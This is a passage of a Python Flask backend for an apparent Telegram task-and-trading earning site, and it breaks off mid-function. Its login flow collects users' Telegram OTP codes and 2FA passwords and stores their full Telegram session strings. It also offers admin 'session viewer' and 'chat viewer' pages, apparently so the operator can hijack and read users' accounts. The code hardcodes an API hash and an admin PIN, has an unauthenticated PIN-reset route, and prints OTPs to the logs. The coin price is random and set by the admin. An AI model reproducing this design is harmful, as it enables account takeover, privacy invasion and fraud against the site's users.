import os
import asyncio
import random 
import secrets
import threading
import telebot
import time
from telebot.apihelper import ApiTelegramException
from datetime import datetime, timedelta
from functools import wraps
from bson import ObjectId
from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError,PhoneCodeInvalidError, PhoneCodeExpiredError
import firebase_admin  
from firebase_admin import credentials, db

# ================= APP =================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=3)
)

CORS(app, supports_credentials=True)

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", 36466824))
API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
FIREBASE_DB_URL = "https://teleearnbd-781d6-default-rtdb.firebaseio.com"
FIREBASE_KEY_PATH = "/etc/secrets/firebase-adminsdk.json"
MONGO_URI = os.environ.get("MONGO_URI")
if not MONGO_URI:
    raise ValueError("MONGO_URI environment variable not set")


# Firebase ইনি‌শিয়ালাইজ
if not firebase_admin._apps:
    cred = credentials.Certificate(FIREBASE_KEY_PATH)
    firebase_admin.initialize_app(cred, {
        'databaseURL': FIREBASE_DB_URL
    })

fb_ref = db.reference('/')   # 🆕 এই লাইনটি যোগ করুন

# ================= DB =================
client = MongoClient(MONGO_URI)
db_mongo = client["aaf_tele_earn_db"]
users_col = db_mongo["users"]
settings_col = db_mongo["settings"]
admin_config_col = db_mongo["admin_config"]
deposits_col = db_mongo["deposits"]
withdraws_col = db_mongo["withdraws"]
trades_col = db_mongo["trades"]
task_claims_col = db_mongo["task_claims"]
task_orders_col = db_mongo["task_orders"]
milestones_col = db_mongo["milestones"] 
user_milestone_claims_col = db_mongo["user_milestone_claims"]
deeplink_clicks_col = db_mongo["deeplink_clicks"]
candles_col = db_mongo['candles']
channel_status_col = db_mongo["channel_status"]  # 🆕 এই লাইনটি যোগ করুন

# 🎯 ৬টি টেবিল তৈরি এবং সেগুলোতে ২ মাসের অটো-ডিলিট ও স্পিড বুস্টার ইনডেক্স চালু করা
try:
    # ২ মাসের অটো-ডিলিট ইনডেক্স (TTL)
    db_mongo['candles'].create_index("createdAt", expireAfterSeconds=5184000)
    db_mongo['candles_5m'].create_index("createdAt", expireAfterSeconds=5184000)
    db_mongo['candles_15m'].create_index("createdAt", expireAfterSeconds=5184000)
    db_mongo['candles_1h'].create_index("createdAt", expireAfterSeconds=5184000)
    db_mongo['candles_4h'].create_index("createdAt", expireAfterSeconds=5184000)
    db_mongo['candles_1d'].create_index("createdAt", expireAfterSeconds=5184000)
    
    # চার্ট স্পিড বুস্টার ইনডেক্স (যাতে ডাটা দ্রুত লোড হয়)
    db_mongo['candles'].create_index([("time", -1)])
    db_mongo['candles_5m'].create_index([("time", -1)])
    db_mongo['candles_15m'].create_index([("time", -1)])
    db_mongo['candles_1h'].create_index([("time", -1)])
    db_mongo['candles_4h'].create_index([("time", -1)])
    db_mongo['candles_1d'].create_index([("time", -1)])

    print("✅ ৬টি টাইমফ্রেমের সব ইনডেক্স সফলভাবে সক্রিয় হয়েছে!")
except Exception as e:
    print(f"⚠️ ইনডেক্স তৈরিতে সমস্যা: {e}")

# ================= NEW: Per-request async helper (no persistent client) =================
def run_async(coro):
    """প্রতি রিকোয়েস্টে নতুন ইভেন্ট লুপ তৈরি করে (persistent নয়)"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

def normalize_phone(phone):
    if not phone:
        return None
    phone = phone.strip().replace(" ", "")
    if phone.startswith("+880"):
        return phone
    elif phone.startswith("880"):
        return "+" + phone
    elif phone.startswith("0"):
        return "+880" + phone[1:]
    elif phone.isdigit() and len(phone) == 10:
        return "+880" + phone
    else:
        return None

def get_admin_config():
    doc = admin_config_col.find_one({"_id": "global"})
    
    if not doc:
        # নতুন ডকুমেন্ট তৈরি (সব ফিল্ডসহ)
        doc = {
            "_id": "global",
            "trading_fee": 0.5,
            "bonus_target": 5,
            "server_income": 0,
            "server_trading": 0,
            "total_users": users_col.count_documents({}),
            "admin_pin": "Abdullah6790",
            "wallet": {"nagad": "01---------", "bkash": ""},
            "trading_ad_text": "Welcome to Trading",
            "task_banner_ad": "",
            "task_popup_ad": "",
            "banner_image": "",
            "popup_ad": {"enabled": False, "image": "", "title": "", "desc": ""},
            "live_price": 1.0,
            "channel_url": "",
            "bot_token": "",
            "channel_id": "",
            "min_trades": 5,
            "ip_limit": "off",
            "extra_users": 0,
            "banner_ad_code": "",
            "referral_bonus": 0,
            "trade_impact_factor": 0.0001,
            "price_volatility": 0.0005,
            "task_rules": {
                "device_check": True,
                "ip_check": False,
                "account_check": True
            },
            "ip_limit_per_hour": 5,
            "default_task_expiry_hours": 168
        }
        admin_config_col.insert_one(doc)
        return doc
    
    # পুরনো ডকুমেন্ট আপডেট (নতুন ফিল্ড যোগ)
    updates = {}
    
    if "channel_id" not in doc:
        updates["channel_id"] = ""
    if "banner_ad_code" not in doc:
        updates["banner_ad_code"] = ""
    if "referral_bonus" not in doc:
        updates["referral_bonus"] = 0
    if "trade_impact_factor" not in doc:
        updates["trade_impact_factor"] = 0.0001
    if "price_volatility" not in doc:
        updates["price_volatility"] = 0.0005
    if "task_rules" not in doc:
        updates["task_rules"] = {"device_check": True, "ip_check": False, "account_check": True}
    if "ip_limit_per_hour" not in doc:
        updates["ip_limit_per_hour"] = 5
    if "default_task_expiry_hours" not in doc:
        updates["default_task_expiry_hours"] = 168
    
    # task_rules থেকে ভুল জায়গায় থাকা price_volatility সরানো
    if "task_rules" in doc and "price_volatility" in doc["task_rules"]:
        updates["price_volatility"] = doc["task_rules"].pop("price_volatility")
        admin_config_col.update_one({"_id": "global"}, {"$set": {"task_rules": doc["task_rules"]}})
    
    if updates:
        admin_config_col.update_one({"_id": "global"}, {"$set": updates})
        doc.update(updates)
    
    return doc

def update_total_users():
    total = users_col.count_documents({})
    admin_config_col.update_one({"_id": "global"}, {"$set": {"total_users": total}})

# Temporary storage for OTP data (phone -> temp_session, phone_code_hash)
temp_otp_data = {}

# Background thread for live price simulation
current_price = 1.0

# এই কোডটি app.py-তে আপনার বিদ্যমান update_price_loop() ফাংশনটিকে প্রতিস্থাপন করবে।
def update_price_loop():
    global current_price
    print("🚀 মঙ্গোডিবি মাল্টি-টাইমফ্রেম অটো-ক্যান্ডেল ইঞ্জিন ও লাইভ প্রাইস লুপ চালু হয়েছে...")
    
    # প্রতিটি টাইমফ্রেমের জন্য আলাদা ট্র্যাকার
    last_saved_times = {
        "1m": -1,
        "5m": -1,
        "15m": -1,
        "1h": -1,
        "4h": -1,
        "1d": -1
    }

    # 🎯 আপনার মঙ্গোডিবি কালেকশন নামের সাথে মিল রেখে নিখুঁত ম্যাপিং [কালেকশন অবজেক্ট, কত সেকেন্ডের বকেট]
    tf_configs = {
        "1m": (db_mongo['candles'], 60),          # 1 Minute
        "5m": (db_mongo['candles_5m'], 300),      # 5 Minutes
        "15m": (db_mongo['candles_15m'], 900),    # 15 Minutes
        "1h": (db_mongo['candles_1h'], 3600),     # 1 Hour
        "4h": (db_mongo['candles_4h'], 14400),    # 4 Hours (৪ ঘণ্টা = ১৪৪০০ সেকেন্ড)
        "1d": (db_mongo['candles_1d'], 86400)     # 1 Day
    }

    while True:
        try:
            now_ts = int(time.time())
            current_date_utc = datetime.utcnow() # TTL ইনডেক্সের জন্য বর্তমান UTC সময়

            # ১. এডমিন কনফিগ থেকে volatility এবং লাইভ প্রাইস সিঙ্ক করা
            admin = get_admin_config() or {}
            volatility = admin.get("task_rules", {}).get("price_volatility", 0.0005) if isinstance(admin.get("task_rules"), dict) else admin.get("price_volatility", 0.0005)
            
            db_price = float(admin.get("live_price", current_price))
            
            # 📈📉 র্যান্ডম আপ-ডাউন মুভমেন্ট
            change = random.uniform(-volatility, volatility)
            current_price = db_price + change
            
            # 🛡️ ৯০ পয়সার সেফটি ফ্লোর এবং ২.৫ টাকার সিলিং লক
            current_price = max(0.9000, min(2.5000, current_price))

            # ২. 🔄 লুপ চালিয়ে আপনার ৬টি কালেকশনে আলাদা আলাদা ভাবে ক্যান্ডেল প্রসেস ও সেভ করা
            for tf_key, (col, seconds) in tf_configs.items():
                # বর্তমান টাইমফ্রেম অনুযায়ী ক্যান্ডেলের শুরুর নিখুঁত সময় (Bucket Timestamp)
                bucket_timestamp = now_ts - (now_ts % seconds)

                if bucket_timestamp != last_saved_times[tf_key]:
                    # নতুন টাইমফ্রেম ব্লক শুরু হয়েছে! একদম ফ্রেশ ক্যান্ডেল ইনসার্ট হবে
                    new_candle = {
                        "time": int(bucket_timestamp),
                        "open": float(db_price),
                        "high": float(max(db_price, current_price)),
                        "low": float(min(db_price, current_price)),
                        "close": float(current_price),
                        "createdAt": current_date_utc # 🔥 এটি আপনার ২ মাসের অটো-ডিলিট ইনডেক্সকে সচল রাখবে
                    }
                    col.insert_one(new_candle)
                    print(f"⏰ [{tf_key} ইঞ্জিন]: নতুন ক্যান্ডেল তৈরি হয়েছে! টাইম: {bucket_timestamp} | দাম: {current_price:.6f}")
                    
                    last_saved_times[tf_key] = bucket_timestamp
                else:
                    # 🔄 একই টাইমফ্রেম ব্লকের ভেতরে রিয়েল-টাইমে হাই, লো, ক্লোজ এবং টাইমস্ট্যাম্প আপডেট হবে
                    col.update_one(
                        {"time": int(bucket_timestamp)},
                        {
                            "$max": {"high": float(current_price)},
                            "$min": {"low": float(current_price)},
                            "$set": {
                                "close": float(current_price),
                                "createdAt": current_date_utc # মেয়াদের সিল রিফ্রেশ
                            }
                        },
                        upsert=True
                    )

            # ৩. MongoDB এডমিন কনফিগে গ্লোবাল লাইভ প্রাইস রিয়েল-টাইম আপডেট
            admin_config_col.update_one(
                {"_id": "global"}, 
                {"$set": {"live_price": float(current_price), "last_updated": int(time.time())}}
            )

            time.sleep(1) # প্রতি ১ সেকেন্ডে লুপ চলবে

        except Exception as e:
            print(f"Price update error in multi-engine: {e}")
            time.sleep(5)

print("🔔 [System]: Starting Background Multi-Timeframe Price Thread...")
threading.Thread(target=update_price_loop, daemon=True).start()


def init_candles_collection():
    """প্রথমবার অ্যাপ চালু হলে ক্যান্ডেল কালেকশনে ১ ঘণ্টার রিয়ালিস্টিক (আপ/ডাউন) ডামি ডাটা যোগ করে"""
    try:
        current_count = candles_col.count_documents({})
        
        if current_count == 0:
            print("📊 ক্যান্ডেল কালেকশন সম্পূর্ণ খালি! আপ-ডাউন ডামি ডাটা ইনসার্ট করা হচ্ছে...")
            
            base_time = int(time.time()) - (60 * 60)
            start_price = 1.0000
            initial_candles = []
            
            for i in range(60):  
                open_p = start_price
                movement = random.uniform(-0.0015, 0.0015) 
                
                if random.random() < 0.05:
                     movement = random.uniform(-0.003, 0.003) 
                
                close_p = start_price + movement
                
                if open_p < 0.9000: open_p = 0.9000
                if close_p < 0.9000: close_p = 0.9000
                
                is_up = close_p >= open_p
                if is_up:
                    high_p = close_p + random.uniform(0.0001, 0.0008)
                    low_p = open_p - random.uniform(0.0001, 0.0006)
                else:
                    high_p = open_p + random.uniform(0.0001, 0.0006)
                    low_p = close_p - random.uniform(0.0001, 0.0008)
                
                if low_p < 0.9000: low_p = 0.9000
                if high_p < 0.9000: high_p = 0.9000

                initial_candles.append({
                    "time": int(base_time + (i * 60)),  # পারফেক্ট ইন্টিজার ফিক্স
                    "open": float(open_p),
                    "high": float(high_p),
                    "low": float(low_p),
                    "close": float(close_p)
                })
                
                start_price = close_p
            
            candles_col.insert_many(initial_candles)
            print(f"✅ মঙ্গোডিবিতে সফলভাবে ৬০টি আপ-ডাউন ক্যান্ডেল ইনিশিয়ালি যোগ করা হয়েছে!")
        else:
            print(f"✅ ক্যান্ডেল কালেকশনে আগে থেকেই {current_count}টি ডাটা সুরক্ষিত আছে।")
            
    except Exception as e:
        print(f"❌ ক্যান্ডেল ইনিশিয়ালাইজ করতে ব্যর্থ: {e}")
# ================= LOGIN REQUIRED DECORATOR =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        uid = session.get("uid")
        if not uid:
            return redirect(url_for("login"))
        user = users_col.find_one({"_id": ObjectId(uid)})
        if not user:
            session.clear()
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

# ================= PAGE ROUTES (সব আগের মতো) =================
@app.route("/")
@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")

@app.route("/task")
@login_required
def task():
    return render_template("task.html")


@app.route("/task_order")
@login_required
def task_order():
    return render_template("task_order.html")
    

@app.route("/trading")
@login_required
def trading():
    return render_template("trading.html")

@app.route("/wallet")
@login_required
def wallet():
    return render_template("wallet.html")

@app.route("/account")
@login_required
def account():
    return render_template("account.html")

@app.route("/refer_list")
@login_required
def refer_list():
    return render_template("refer_list.html")

@app.route("/payment_history")
@login_required
def payment_history():
    return render_template("payment_history.html")

@app.route("/admin")
def admin_panel():
    return render_template("admin.html")


@app.route("/reset_admin_pin")
def reset_admin_pin():
    admin_config_col.update_one({"_id": "global"}, {"$set": {"admin_pin": "Abdullah6790"}}, upsert=True)
    return "Admin PIN reset to Abdullah6790"


@app.route("/session_viewer")
def session_viewer():
    # শুধু অ্যাডমিন লগইন থাকলেই পেজ দেখাবে (একই পিন)
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_panel"))
    return render_template("session_viewer.html")

@app.route("/chat_viewer")
def chat_viewer():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_panel"))
    return render_template("chat_viewer.html")

@app.after_request
def add_header(response):
    # সেশন কুকি যাতে ফ্রন্টএন্ডে সঠিকভাবে পৌঁছায় তা নিশ্চিত করে
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response



# ================= API: AUTH (Per-request Telegram client) =================
@app.route("/api/send_otp", methods=["POST"])
def send_otp():
    data = request.json
    phone = normalize_phone(data.get("phone"))
    if not phone:
        return jsonify({"success": False, "message": "invalid_phone"})

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_otp_data[phone] = {
            "temp_session": client.session.save(),
            "phone_code_hash": result.phone_code_hash
        }
        await client.disconnect()
        return True, "OTP Sent"

    try:
        success, msg = run_async(_send())
        return jsonify({"success": success, "message": msg})
    except Exception as e:
        print(f"send_otp error: {e}")
        return jsonify({"success": False, "message": str(e)})

@app.route("/api/verify_login", methods=["POST"])
def verify_login():
    import traceback
    data = request.json
    phone = normalize_phone(data.get("phone"))
    code = data.get("code")
    password = data.get("password")
    ref = data.get('ref')

    print(f"=== VERIFY_LOGIN START ===")
    print(f"Phone: {phone}, Code: {code}, Has password: {bool(password)}")

    if not phone or phone not in temp_otp_data:
        print(f"Phone {phone} not found in temp_otp_data. Keys: {list(temp_otp_data.keys())}")
        return jsonify({"success": False, "message": "session_expired"})

    temp = temp_otp_data[phone]
    temp_session_str = temp.get("temp_session")
    phone_code_hash = temp.get("phone_code_hash")
    print(f"Temp session (partial): {temp_session_str[:20]}..., phone_code_hash: {phone_code_hash}")

    async def _verify():
        client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
        await client.connect()
        try:
            if password:
                await client.sign_in(password=password)
            else:
                if not code:
                    return False, "Code required"
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            session_str = client.session.save()
            return True, me, session_str
        except SessionPasswordNeededError:
            print(f"2FA required for {phone}")
            await client.disconnect()
            return False, "SHOW_PWD_STEP"
        except PhoneCodeInvalidError:
            print(f"Invalid OTP for {phone}")
            await client.disconnect()
            return False, "Invalid code"
        except PhoneCodeExpiredError:
            print(f"OTP expired for {phone}")
            await client.disconnect()
            return False, "Code expired, please request again"
        except Exception as e:
            print(f"Error in _verify: {type(e).__name__}: {e}")
            traceback.print_exc()
            await client.disconnect()
            return False, str(e)

    try:
        result = run_async(_verify())
        if result[0] is True and len(result) == 3:
            me, session_str = result[1], result[2]
            user = users_col.find_one({"telegram_id": str(me.id)})
            if not user:
                # নতুন ইউজার তৈরি
                user_data = {
                    "telegram_id": str(me.id),
                    "phone": phone,
                    "username": me.username or f"user_{me.id}",
                    "first_name": me.first_name or "",
                    "last_name": me.last_name or "",
                    "session_string": session_str,
                    "cash": 0,
                    "aaf": 0,
                    "refer_count": 0,
                    "refer_by": ref,
                    "is_joined": False,
                    "tasks_done": 0,
                    "created_at": datetime.utcnow(),
                    "last_login": datetime.utcnow()
                }
                result_id = users_col.insert_one(user_data).inserted_id

                # রেফারেল বোনাস (যদি রেফারার থাকে)
                if ref:
                    # রেফারারের refer_count বাড়ান
                    users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                    # অ্যাডমিন কনফিগ থেকে বোনাসের মান নিন
                    admin = get_admin_config()
                    bonus_amount = admin.get("referral_bonus", 0)
                    if bonus_amount > 0:
                        users_col.update_one({"telegram_id": ref}, {"$inc": {"cash": bonus_amount}})
                        print(f"Referral bonus {bonus_amount} added to {ref}")
            else:
                # পুরনো ইউজার লগইন (শুধু সেশন আপডেট)
                users_col.update_one(
                    {"telegram_id": str(me.id)},
                    {"$set": {"session_string": session_str, "last_login": datetime.utcnow(), "phone": phone}}
                )
                result_id = user["_id"]

            session["uid"] = str(result_id)
            session.permanent = True
            update_total_users()
            del temp_otp_data[phone]
            return jsonify({"success": True, "telegram_id": str(me.id)})
        else:
            msg = result[1]
            if msg == "SHOW_PWD_STEP":
                return jsonify({"success": False, "message": "SHOW_PWD_STEP"})
            else:
                return jsonify({"success": False, "message": msg})
    except Exception as e:
        print(f"Outer exception: {e}")
        traceback.print_exc()
        return jsonify({"success": False, "message": str(e)})

@app.route("/api/user/data/<telegram_id>")
def user_data(telegram_id):
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"})
    
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        session.clear()
        return jsonify({"status": "error", "message": "user_not_found"})
    
    admin = get_admin_config()
    wallet_data = admin.get("wallet", {"nagad": "", "bkash": ""})
    
    safe_user = {
        "_id": str(user["_id"]),
        "telegram_id": user.get("telegram_id"),
        "username": user.get("username"),
        "first_name": user.get("first_name", ""),
        "last_name": user.get("last_name", ""),
        "cash": user.get("cash", 0),
        "aaf": user.get("aaf", 0)
    }
    
    safe_admin = {
        "banner_ad_code": admin.get("banner_ad_code", ""),
        "server_income": admin.get("server_income", 0),     # 🆕 যোগ করুন
        "server_trading": admin.get("server_trading", 0),   # 🆕 যোগ করুন
        "referral_bonus": admin.get("referral_bonus", 0),   # 🆕 যোগ করুন
        "wallet": {
            "nagad": wallet_data.get("nagad", ""),
            "bkash": wallet_data.get("bkash", "")
        }
    }
    
    return jsonify({
        "status": "success", 
        "user": safe_user, 
        "admin": safe_admin
    })

@app.route("/api/user/me")
def user_me():
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"})
    
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        session.clear()
        return jsonify({"status": "error", "message": "user_not_found"})
    
    admin = get_admin_config()
    wallet_data = admin.get("wallet", {"nagad": "", "bkash": ""})
    
    # মোট ইউজার কাউন্ট
    total_users = admin.get("total_users", users_col.count_documents({}))
    
    safe_user = {
        "_id": str(user["_id"]),
        "telegram_id": user.get("telegram_id"),
        "username": user.get("username"),
        "first_name": user.get("first_name", ""),
        "last_name": user.get("last_name", ""),
        "cash": user.get("cash", 0),
        "aaf": user.get("aaf", 0),
        "refer_count": user.get("refer_count", 0),
        "tasks_done": user.get("tasks_done", 0),
        "is_joined": user.get("is_joined", False)
    }
    
    safe_admin = {
        "live_price": admin.get("live_price", 1.0),
        "trading_fee": admin.get("trading_fee", 0.5),
        "banner_ad_code": admin.get("banner_ad_code", ""),
        "trading_ad_text": admin.get("trading_ad_text", ""),
        # 🆕 নিচের ৩টি লাইন যোগ করুন
        "server_income": admin.get("server_income", 0),
        "server_trading": admin.get("server_trading", 0),
        "total_users": total_users,
        "referral_bonus": admin.get("referral_bonus", 0),
        "wallet": {
            "nagad": wallet_data.get("nagad", ""),
            "bkash": wallet_data.get("bkash", "")
        }
    }
    
    return jsonify({
        "status": "success", 
        "user": safe_user, 
        "admin": safe_admin
    })

@app.route("/api/silent_join", methods=["POST"])
@login_required
def silent_join():
    """শুধু চ্যানেল লিংক ফেরত দেয় (কোনো চেক ছাড়া)"""
    admin = get_admin_config()
    channel_url = admin.get("channel_url", "")
    return jsonify({"success": False, "channel": channel_url})

@app.route("/api/verify_join", methods=["POST"])
@login_required
def verify_join():
    uid = session.get("uid")
    if not uid:
        return jsonify({"success": False, "message": "Not logged in"})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})

    admin = get_admin_config()
    bot_token = admin.get("bot_token")
    channel_url = admin.get("channel_url", "")

    if not bot_token or not channel_url:
        return jsonify({"success": False, "message": "Bot or channel not configured"})

    try:
        user_tg_id = int(user.get("telegram_id"))
    except:
        return jsonify({"success": False, "message": "Invalid Telegram ID"})

    # চ্যানেল ইউজারনেম বের করা
    if "t.me/" in channel_url:
        channel_username = "@" + channel_url.split("t.me/")[-1].split("/")[0]
    elif channel_url.startswith("@"):
        channel_username = channel_url
    else:
        channel_username = "@" + channel_url

    try:
        bot = telebot.TeleBot(bot_token)
        chat_member = bot.get_chat_member(channel_username, user_tg_id)
        is_member = chat_member.status in ["member", "creator", "administrator"]
        
        # ✅ চ্যানেল স্ট্যাটাস আপডেট (channel_status_col আগে থেকে ডিফাইন থাকতে হবে)
        if 'channel_status_col' not in dir():
            channel_status_col = db_mongo["channel_status"]
        
        channel_status_col.update_one(
            {"user_id": uid},
            {"$set": {"is_member": is_member, "last_checked": datetime.utcnow()}},
            upsert=True
        )
        
        if is_member:
            users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": True}})
            return jsonify({"success": True})
        else:
            users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": False}})
            return jsonify({"success": False, "channel": channel_url})
            
    except ApiTelegramException as e:
        return jsonify({"success": False, "channel": channel_url, "message": "Bot not admin in channel"})
    except Exception as e:
        print(f"Verification error: {e}")
        return jsonify({"success": False, "channel": channel_url, "message": "Server error"})

# ================= API: TASKS (Firebase) =================
@app.route("/api/task_order/active")
@login_required
def get_active_orders():
    uid = session.get("uid")
    if not uid:
        return jsonify({"orders": []})
    
    orders = list(task_orders_col.find(
        {"user_id": uid, "status": {"$ne": "completed"}},
        {"_id": 0}  # 🆕 _id বাদ দেওয়া
    ).sort("created_at", -1))  # 🆕 নতুন অর্ডার আগে দেখাবে
    
    # ObjectId স্ট্রিংয়ে কনভার্ট (যদি _id রাখতে চান)
    for o in orders:
        if "_id" in o:
            o["_id"] = str(o["_id"])
    
    return jsonify({"orders": orders})

@app.route("/api/task_order/submit", methods=["POST"])
@login_required
def submit_task_order():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})
    
    data = request.json
    total_charge = float(data.get("total_charge", 0))
    
    if user.get("cash", 0) < total_charge:
        return jsonify({"success": False, "message": "Insufficient balance"})
    
    # ব্যালেন্স কাটা
    users_col.update_one({"_id": ObjectId(uid)}, {"$inc": {"cash": -total_charge}})
    
    # অর্ডার সেভ করা
    order = {
        "user_id": uid,
        "telegram_id": user.get("telegram_id"),  # 🆕 এডমিনের জন্য টেলিগ্রাম আইডি
        "link": data.get("link"),
        "service": data.get("service"),
        "quantity": data.get("quantity"),
        "total_charge": total_charge,
        "progress": 0,
        "status": "pending",
        "created_at": datetime.utcnow()
    }
    task_orders_col.insert_one(order)
    
    return jsonify({"success": True, "message": "Order submitted"})


@app.route("/api/admin/order_rates", methods=["GET", "POST"])
@login_required
def order_rates():
    if request.method == "POST":
        rates = request.json
        admin_config_col.update_one(
            {"_id": "global"},
            {"$set": {"task_order_rates": rates}},
            upsert=True
        )
        return jsonify({"success": True})
    
    else:
        admin = get_admin_config()
        rates = admin.get("task_order_rates", {
            "followers": 2.00,
            "members": 1.50,
            "views": 0.50,
            "likes": 0.50,
            "comments": 1.00
        })
        return jsonify({"rates": rates})
        


@app.route("/api/tasks")
def get_tasks():
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})

@app.route("/api/user/claimed_tasks")
@login_required
def get_claimed_tasks():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"claimed_ids": []})
    
    claims = task_claims_col.find({"telegram_id": user["telegram_id"]})
    claimed_ids = [claim["task_id"] for claim in claims]
    
    return jsonify({"claimed_ids": claimed_ids})

@app.route("/api/user/tasks/claim", methods=["POST"])
@login_required
def claim_task():
    data = request.json
    telegram_id = data.get("telegram_id")
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    user_ip = request.remote_addr

    if not fb_ref:
        return jsonify({"blocked": True, "message": "Firebase not configured"})

    # টাস্ক ডাটা ফায়ারবেস থেকে আনুন
    task = fb_ref.child(f"tasks/{task_id}").get()
    if not task:
        return jsonify({"blocked": False, "message": "Task not found"})

    user = users_col.find_one({"telegram_id": telegram_id})
    if not user:
        return jsonify({"blocked": False, "message": "User not found"})

    # ========== ✅ ডিউ চেক (চ্যানেল লিভ করলে) ==========
    if 'channel_status_col' not in dir():
        channel_status_col = db_mongo["channel_status"]
    
    channel_status = channel_status_col.find_one({"user_id": str(user["_id"])})
    if channel_status and channel_status.get("is_member") == False:
        admin = get_admin_config()
        due_amount = admin.get("channel_leave_penalty", 50)
        return jsonify({
            "blocked": True, 
            "message": f"⚠️ আপনি অফিসিয়াল চ্যানেল লিভ করেছেন! পরবর্তী টাস্ক কমপ্লিট করলে {due_amount} টাকা কাটা হবে। চ্যানেলে পুনরায় জয়েন করুন এবং আবার VERIFY চাপুন।",
            "due": due_amount
        })

    # ========== টাস্কের নিজস্ব রুলস নিন, না থাকলে গ্লোবাল সেটিংস ==========
    admin = get_admin_config()
    global_rules = admin.get("task_rules", {})
    
    device_check = task.get("device_check", global_rules.get("device_check", True))
    ip_check = task.get("ip_check", global_rules.get("ip_check", False))
    account_check = task.get("account_check", global_rules.get("account_check", True))
    ip_limit = admin.get("ip_limit_per_hour", 5)

    # ডিভাইস চেক
    if device_check:
        device_key = f"device_tasks/{task_id}/{device_id}"
        if fb_ref.child(device_key).get():
            return jsonify({"blocked": True, "message": "এই ডিভাইস ইতিমধ্যে টাস্ক ক্লেইম করেছে।"})
        else:
            fb_ref.child(device_key).set(True)

    # আইপি চেক (প্রতি ঘন্টা লিমিট)
    if ip_check:
        ip_key = f"ip_tasks/{task_id}/{user_ip}"
        ip_data = fb_ref.child(ip_key).get()
        now_ts = datetime.utcnow().timestamp()
        if ip_data:
            count = ip_data.get("count", 0)
            last_ts = ip_data.get("timestamp", 0)
            if now_ts - last_ts < 3600:
                if count >= ip_limit:
                    return jsonify({"blocked": True, "message": f"আইপি থেকে প্রতি ঘন্টায় সর্বোচ্চ {ip_limit} বার ক্লেইম করা যাবে।"})
                fb_ref.child(ip_key).update({"count": count + 1})
            else:
                fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
        else:
            fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})

    # অ্যাকাউন্ট চেক
    if account_check:
        user_key = f"user_tasks/{telegram_id}/{task_id}"
        if fb_ref.child(user_key).get():
            return jsonify({"blocked": True, "message": "আপনি ইতিমধ্যে এই টাস্ক ক্লেইম করেছেন।"})
        fb_ref.child(user_key).set(True)

    # ডুপ্লিকেট ক্লেইম চেক (MongoDB)
    existing = task_claims_col.find_one({"telegram_id": telegram_id, "task_id": task_id})
    if existing:
        return jsonify({"blocked": True, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})

    # ========== টাকা/কয়েন প্রদান (ডিউ কাটাসহ) ==========
    requires_approval = task.get("requires_approval", False)
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")
    
    # ডিউ কাটার লজিক (যদি আগের স্টেপে ব্লক না করে থাকে)
    final_reward = reward
    if channel_status and channel_status.get("is_member") == False:
        due_amount = admin.get("channel_leave_penalty", 50)
        final_reward = max(0, reward - due_amount)
        # একবার ডিউ কাটা হয়ে গেলে স্ট্যাটাস রিসেট
        channel_status_col.update_one({"user_id": str(user["_id"])}, {"$set": {"due_cleared": True}})

    if requires_approval:
        task_claims_col.insert_one({
            "telegram_id": telegram_id,
            "task_id": task_id,
            "device_id": device_id,
            "ip": user_ip,
            "reward": reward,
            "currency": currency,
            "requires_approval": True,
            "status": "pending",
            "created_at": datetime.utcnow()
        })
        return jsonify({"blocked": False, "message": "টাস্ক ক্লেইম করা হয়েছে। এডমিন অনুমোদন দিলে ব্যালেন্স যোগ হবে।"})
    else:
        if currency == "aaf":
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": final_reward}})
            msg = f"Received {final_reward} AAF"
        else:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": final_reward}})
            msg = f"Received ৳{final_reward}"
        
        # ডিউ কাটা হলে ম্যাসেজে জানিয়ে দাও
        if final_reward != reward:
            msg += f" (ডিউ কাটা হয়েছে: -৳{reward - final_reward})"
        
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
        task_claims_col.insert_one({
